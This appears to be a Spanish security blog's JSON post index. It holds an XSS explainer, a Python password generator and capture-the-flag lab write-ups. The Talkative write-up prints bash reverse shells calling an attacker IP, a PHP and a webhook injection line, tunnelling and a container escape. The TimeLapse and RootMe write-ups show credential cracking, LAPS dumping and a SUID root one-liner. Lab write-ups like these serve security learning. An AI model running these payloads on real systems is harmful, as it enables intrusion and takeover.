[ { "title": "Cross-site scripting", "url": "/posts/xss/", "categories": "XSS, blogging", "tags": "XSS, blogging", "date": "2022-08-30 18:00:00 +0200", "snippet": "¿Qué es un ataque XSS?Un ataque XSS o también conocido como ataque cross-site scripting es un tipo de ataque que es muy común en aplicaciones web, el atacante injecta un script malicioso en una web normal y el servidor interpreta el código y puede cuando otro usuario entre a esa sección de la aplicación web.Tipos de XSS1-Reflected XSSEl XSS reflejado o reflected XSS se produce cuando una aplicación web devuelve la entrada de usuario en forma de mensaje de error, en algunos casos los datos proporcionados por el usuario sean del navegador.2-Stored XSSEl Stored XSS o XSS almacenado se produce cuando el código malicioso se guarda en el servidor de alguna forma, puede ser en la base de datos, en los logins etc, el código será ejecutado por el navegador de la víctima al entrar a la sección infectada de la aplicación web, este tipo de XSS también es conocido como Type-I XSS.3-DOM XSSSe da cuando el código malicioso se inyecta mediante una URL pero la web no contiene el código en su código fuente, el código sale de la propia URL que crea el atacante y el servidor lo ejecuta, este tipo de XSS también se conoce como Type-II XSS.Imagenes de: ImpervaInformación de: OWASP" }, { "title": "TimeLapse hackthebox writeup", "url": "/posts/timelapse/", "categories": "Hackthebox, machine, writeup", "tags": "Hackthebox, writeup", "date": "2022-08-30 18:00:00 +0200", "snippet": "Empezamos con el escaneo de puertos sobre la máquinaNmap scan report for 10.10.11.152PORT STATE SERVICE53/tcp open domain88/tcp open kerberos-sec135/tcp open msrpc139/tcp open netbios-ssn389/tcp open ldap445/tcp open microsoft-ds464/tcp open kpasswd5593/tcp open http-rpc-epmap636/tcp open ldapssl3268/tcp open globalcatLDAP3269/tcp open globalcatLDAPssl5986/tcp open wsmans9389/tcp open adwsCómo vemos que está el servicio SMB habilitado vamos a empezar a enumerar❯ smbclient -L 10.10.11.152Enter WORKGROUP\\root's password:\tSharename Type Comment\t--------- ---- -------\tADMIN$ Disk Remote Admin\tC$ Disk Default share\tIPC$ IPC Remote IPC\tShares Disk Dentro de Shares/Dev/ hay un archivo zip, podemos descargarlo con smbmap con el parámetro –download o con la consola interactiva de smbclientEl zip tiene una contraseña, la podemos crackear con johnjohn --wordlist=/usr/share/wordlists/rockyou.txt hashzipAl descomprimir el zip se puede ver un archivo .pfx que se puede usar para extraer un certificado y conectarse a la máquina por winrm❯ lshashzip legacyy_dev_auth.pfx pfxhash winrm_backup.zip❯ john --wordlist=/usr/share/wordlists/rockyou.txt pfxhashthuglegacy (legacyy_dev_auth.pfx)openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.keyopenssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crtAhora con los siguientes parámetros nos podemos conectar por evil-winrm-c: certificate-k key-S: SSL mode❯ evil-winrm -S -i 10.10.11.152 -c crt -k keyEnter PEM pass phrase: thuglegacyPS C:\\Users\\legacyy\\Desktop&gt; type user.txt********************************Al ejecutar WinPeas podemos ver que hay un archivo de historial que podemos leer, en este tipo de archivos podemos encontrar contraseñasC:\\Users\\legacyy\\AppData\\Roaming\\Microsoft\\Windows\\Powershell\\PSReadLine\\ConsoleHost_history.txtEfectivamente encontramos una contraseña para el usuario svc_deploy, con esto podríamos conectarnos contra la administración remota de windows ya que el usuario pertenece a remote management users$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)El usuario pertenece al grupo LAPS Readers que nos permite algunas cosas interesantesPodemos usar crackmapexec, LAPSDumper y otras herramientas para intentar crear una contraseña temporal para el usuario Administrator, en este caso voy a usar LAPSDumper python3 laps.py -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htbEsto nos devuelve directamente el nombre del DC y su contraseña temporal en texto claroCon eso ya solo queda conectarnos por winrm con ñas credenciales obtenidas, en este caso tenemos que usar el parámetro -S para poner el modo SSL ya que el puerto 5986 tiene wsmans en lugar de wsman❯ evil-winrm -S -i 10.10.11.152 -u Administrator -p 'temporal_password'PS C:\\Users\\TRX/Desktop&gt; type root.txt********************************Y con esto terminamos la máquina TimeLapse." }, { "title": "Cómo crear una contraseña segura con Python", "url": "/posts/python-password/", "categories": "Python, Password", "tags": "Password, security", "date": "2022-08-30 18:00:00 +0200", "snippet": "Cómo crear una contraseña segura con python¿Qué es python?Python es un lenguaje de programación usado para aplicaciones de todo tipo, entre ellas se encuentran: aplicaciones web, aplicaciones de escritorio y gráficas, aplicaciones de terminal. Se usa mucho para automatizar acciones es un lenguaje de programación multiparadigma, ya que soporta parcialmente la programación orientada a objetos.¿Qué tiene que tener una contraseña segura?Para que tu contraseña sea segura tiene que tener más de 15 caracteres, entre ellos debe haber: Caracteres especiales (#$%&amp;) Números (254) Letras (abc) Mayúsculas y minúsculasTambién es importante: Que no sea una palabra Que no esté relaccionada contigo Que no se repita en otras cuentasCómo hacer una contraseña segura con PythonEste es un ejemplo de como hacer una contraseña segura con Python:import base64from random import choicechars = 'qwertyuiopasdfghjklzzxcvbnmdfg'nums = '1230983655645987'chars_uppercase = chars.upper()specials = '!$%&amp;'all = chars_uppercase+nums+chars+specialspass_gen = ''.join( choice(all) for i in range(60))encoded_pass = (base64.b64encode(pass_gen.encode('ascii')))encoded_ascii = encoded_pass.decode('ascii')print(encoded_ascii)Explicación del códigoEmpezamos importando las librerías, para este proyecto solo se necesita el módulo choice de la librería random y la librería base64.Después creamos las variables principales que vamos a usar, en este caso son: chars (caracteres), nums (números), specials (caracteres especiales), es importante que los caracteres sean aleatorios para una mayor seguridad.Lo siguiente es crear una variable que mezcle todas las variables anteriores, para crear una sola.Después creamos la variable password y meteremos el código para crear la contraseña de forma aleatoria, en mi código puse 50 porque quiero 50 dígitos en mi contraseña, esto se puede cambiar.Lo siguiente es encriptar la contraseña, yo usé base64 pero la librería base64 incluye base16, base58, base32…, por último imprimimos la contraseña por consola para ver el resultado final.Lo de convertirlo a base64 es opcional, esto evade completamente los simbolos especiales, si quieres los simbolos simplemente usa este código:from random import choicechars = 'qwertyuiopasdfghjklzzxcvbnmdfg'nums = '1230983655645987'chars_uppercase = chars.upper()specials = '!$%&amp;'all = chars_uppercase+nums+chars+specialspass_gen = ''.join( choice(all) for i in range(60))print(pass_gen)" }, { "title": "Talkative hackthebox writeup", "url": "/posts/talkative-writeup/", "categories": "Hackthebox, machine, writeup", "tags": "Hackthebox, writeup", "date": "2022-08-29 18:00:00 +0200", "snippet": "Empezamos con el escaneo de nmap sobre los puertos de la máquina❯ sudo nmap -sS -p- --open --min-rate 5000 -vvv -n -Pn 10.10.11.155 -oG allPortsScanning 10.10.11.155 [65535 ports]Discovered open port 8080/tcp on 10.10.11.155Discovered open port 80/tcp on 10.10.11.155Discovered open port 8081/tcp on 10.10.11.155Discovered open port 3000/tcp on 10.10.11.155Discovered open port 8082/tcp on 10.10.11.155Nmap scan report for 10.10.11.155PORT STATE SERVICE REASON80/tcp open http syn-ack ttl 623000/tcp open ppp syn-ack ttl 628080/tcp open http-proxy syn-ack ttl 628081/tcp open blackice-icecap syn-ack ttl 628082/tcp open blackice-alerts syn-ack ttl 62Explicación: -sS: TCP SYN port scan -p-: todo el rango de puertos (0-65535) --open: filtrar por puertos con status open --min-rate 5000: que envie como mínimo 5000 por segundo -vvv: para que te reporte los puertos abiertos antes de que termine el escaneo -n: para que no te aplique resolución DNS -Pn: para que no te aplique resolución de hosts através del protocolo de resolución de direcciones (ARP) -oG: para que te exporte la información en formato grepeableComo está el puerto 80 abierto podemos ir directamente a la web pero nos redirige a un dominio, esto lo podemos comprobar con curl❯ curl 10.10.11.155&lt;html&gt;&lt;head&gt;&lt;title&gt;301 Moved Permanently&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;Moved Permanently&lt;/h1&gt;&lt;p&gt;The document has moved &lt;a href=\"http://talkative.htb\"&gt;here&lt;/a&gt;.&lt;/p&gt;&lt;hr&gt;&lt;/body&gt;&lt;/html&gt;En el puerto 80 no encontramos nada interesante, podemos ir al puerto 8080 a ver su contenidoPodemos ver que hay una aplicación de Hoja de cálculo normal, tenemos disponible un editor que nos permite ejecutar código, vamos a intentar ejecutar una reverse shell, ya que esta web ejecuta código PHPEn este caso voy a usar esta reverse shell:system('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.75/1234 0&gt;&amp;1\"')Nos llega una reverse shell de un contenedor, no podemos entrar desde aquí a la máquina real pero podemos revisar los archivos de la máquina❯ sudo nc -lvnp 1234listening on [any] 1234 ...connect to [10.10.14.75] from (UNKNOWN) [10.10.11.155] 45940root@b06821bbda78:/# whoamiwhoamirootroot@b06821bbda78:/# hostname -Ihostname -I172.18.0.2 root@b06821bbda78:/#Encontramos el archivo /root/bolt-administration.omv, no tenemos nada dentro de la máquina para poder descargar este archivo en nuestra máquina, podemos usar pwncat-cs para descargarlo directamente cuando nos llega la reverse shellUna vez descargado podemos ver que contiene usuarios y contraseñas, creamos una expresión regular para poder filtrar por los que nos interesa, finalmente quedaría así:mattjanitsauljeO09ufhWD&lt;sbZ89h}V&lt;S_DA)SQWGm&gt;9KHEAHaciendo Fuzzing sobre el dominio podemos encontrar el directorio bolt que contiene una página de inicio de sesión, podemos probar las crendenciales que hemos encontrado anteriormente a ver si las reutilizan aquíEl usuario admin funciona con la contraseña jeO09ufhWD&lt;s , así que iniciamos sesión con las credencialesUna vez iniciada la sesión podemos ver un apartado de configuración, dentro hay un apartado llamado All Configuration Files, vamos a ver su contenidoPodemos ver un archivo llamado Bundle.php , como la web interpreta PHP podemos usar la reverse shell anterior para meternos a la máquina&lt;?php\tsystem('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.75/1234 0&gt;&amp;1\"')?&gt;Nos ponemos en escucha con Netcat y nos llega una reverse shell como www-data en un contenedor❯ sudo nc -lvnp 1234listening on [any] 1234 ...connect to [10.10.14.75] from (UNKNOWN) [10.10.11.155] 57846www-data@b922262b694b:/var/www/talkative.htb/bolt/public$ hostname -Ihostname -I172.17.0.15 Esto no nos da mucha información, podemos probar las credenciales encontradas anteriormente por SSH desde el propio contenedorwww-data@b922262b694b:/var/www/talkative.htb/bolt/public$ ssh saul@172.17.0.1Are you sure you want to continue connecting (yes/no/[fingerprint])? yessaul@172.17.0.1 password: jeO09ufhWD&lt;ssaul@talkative:~$ whoamisaulsaul@talkative:~$ cat user.txt cd8c******cb258c950d9edcc065Con pspy descubrimos este procesoCMD: UID=0 PID=4894 | /bin/sh -c python3 /root/.backup/update_mongo.pyEl cual es un script que actualiza la base de datos mongo, el puerto de mongo está abiero así que podemos tunelizar la conexión para poder conectarnos a la base de datos remotamentesaul@talkative:~$ netstat -nattcp 0 0 172.17.0.1:43752 172.17.0.2:27017 TIME_WAITCon chisel tunelizamos la conexión hacia nuestra máquinaMáquina atacante:❯ chisel server --reverse --port 80002022/08/30 17:21:20 server: Reverse tunnelling enabled2022/08/30 17:21:20 server: Fingerprint 4iFocLbXWmRvOoiAYCwK9t8TfvcH6MJOSR1ngLYhgoM=2022/08/30 17:21:20 server: Listening on http://0.0.0.0:8000Máquina víctima:saul@talkative:~$ ./chisel client 10.10.14.75:8000 R:27017:172.17.0.2:270172022/08/30 15:25:37 client: Connecting to ws://10.10.14.75:80002022/08/30 15:25:37 client: Connected (Latency 38.916105ms)Ahora podemos intentar conectarnos a mongoDB e intentar cambiar la contraseña del usuario administrador de la webrs0 [direct: primary] test&gt; show databasesadmin 104.00 KiBconfig 124.00 KiBlocal 11.69 MiBmeteor 4.91 MiBrs0 [direct: primary] test&gt; use meteorswitched to db meteorrs0 [direct: primary] meteor&gt; db.getCollection('users').update({username:\"admin\"}, { $set: {\"services\" : { \"password\" : {\"bcrypt\" : \"$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG\" } } } }){ acknowledged: true, insertedId: null, matchedCount: 1, modifiedCount: 1, upsertedCount: 0}Ahora como tenemos tunelizada la conexión tenemos que meternos por el puerto 8000 el cual está abierto en la máquina a la que nos estamos conectando con ChiselPodemos ir al apartado de Administración&gt;integraciones para crear una nueva integraciónNueva integración&gt;WebHook entranteHabilitado: VerdaderoNomb: ShellCanal: #generalPublicar como: adminscript habilitado: verdaderoVamos a usar la primera línea de este exploit , finalmente queda algo asíconst require = console.log.constructor('return process.mainModule.require')();require('child_process').exec('bash -c \"bash -i &gt;&amp; /dev/tcp/10.10.14.75/1234 0&gt;&amp;1\"');Lo guardamos y hacemos un curl a la URL del webhook con el token que nos pone en la integración que hemos creado❯ curl http://talkative.htb:3000/hooks/hA7ZNgGYHtRhpYBjH/CsNw6amXPMXR4PH9SANT7cyrFaDwhMpLNiiCwHzX9gCfwXcc{\"success\":false}Aunque ponga false nos llega la reverse shell, seguimos en un contenedor y no podemos descargar archivos de la máquina desde dentro❯ nc -lvnp 1234listening on [any] 1234 ...connect to [10.10.14.75] from (UNKNOWN) [10.10.11.155] 57468root@c150397ccd63:/app/bundle/programs/server# hostname -Ihostname -I172.17.0.3Ahora con pwncat-cs nos ponemos en escucha, ejecutamos el comando de curl de antes y con cdk leemos archivos de la máquina real, podemos leer directamente la flag.❯ pwncat-cs -lp 1234[17:41:55] Welcome to pwncat 🐈! (local) pwncat$ upload cdk /root/cdk/root/cdk[17:42:12] uploaded 11.91MiB in 6.67 seconds (local) pwncat$ back(remote) root@c150397ccd63:/app/bundle/programs/server# cd /root(remote) root@c150397ccd63:/root# chmod +x cdk (remote) root@c150397ccd63:/root# ./cdk run cap-dac-read-search /root/root.txt Running with target: /root/root.txt, ref: /etc/hostname57ebcfafa23a47da6507a95d1307beff(remote) root@c150397ccd63:/root#Con esto terminamos la máquina Talkative." }, { "title": "RootMe Tryhackme writeup", "url": "/posts/rootme-writeup/", "categories": "Tryhackme, machine, writeup", "tags": "tryhackme, writeup", "date": "2022-08-27 18:00:00 +0200", "snippet": "Para empezar hacemos un escaneo para ver los puertos abiertos de la máquina:Como veo que están los puertos 22 (SSH) y 80 (HTTP) voy a hacer un escaneo sobre esos dos puertos con los scripts básicos de reconocimiento que aplica Nmap:Vamos a revisar el contenido de la web de el puerto 80:No vemos nada en el código fuente así que vamos a enumerar directorios con gobuster:Vemos el directorio Uploads y el directorio Panel, vamos a revisar el Panel:Se ve que podemos subir archivos, yo probaré con php ya que es lo que interpreta el servidor:No nos permite subirlo, vamos a probar con la extensión phtml que también interpreta php:Nos ha dejado subirlo, podemos aprovechar para subir una reverse shell e ir al directorio uploads para comprobar la subida:Al ver que se ha subido lo único que tenemos que hacer es ponernos en escucha con netcat y dar click en el archivo desde el directorio uploads:Nos ha llegado la reverse shell así que lo siguiente es tratarla:script /dev/null -c bashCtrl + Zstty raw -echo; fgreset xtermexport TERM=xtermexport SHELL=bashLo siguiente es encontrar la flag de usuario, no está en “/home/rootme/user.txt” ni en “/home/test/user.txt” así que vamos a revisar en “/var/www”:Vamos a ver si existen binarios SUID con propietario root:Vemos que el binario de Python tiene permisos SUID así que lo buscamos en GTFObins:python -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'Encontramos un oneliner que nos da una shell de root así que lo probamos:Y con eso terminamos la máquina RootMe." } ]
